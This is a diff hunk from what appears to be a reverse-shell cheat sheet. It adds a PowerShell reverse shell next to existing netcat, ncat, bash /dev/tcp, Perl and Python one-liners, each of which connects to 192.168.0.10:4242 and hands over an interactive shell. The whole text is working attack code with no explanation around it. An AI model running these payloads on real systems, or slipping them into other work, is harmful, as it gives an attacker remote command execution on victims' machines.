@@ -5,6 +5,9 @@ nc 192.168.0.10 4242 -e /bin/bash
 ncat -c bash 192.168.0.10 4242
 
 bash -i >& /dev/tcp/192.168.0.10/4242 0>&1
+
+powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient('192.168.0.10',4242);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$a=(pwd).Path;$sendback2=$sendback+'PS '+$a+'>';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();"
+
 perl -e 'use Socket;$i="192.168.0.10";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.10",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
 
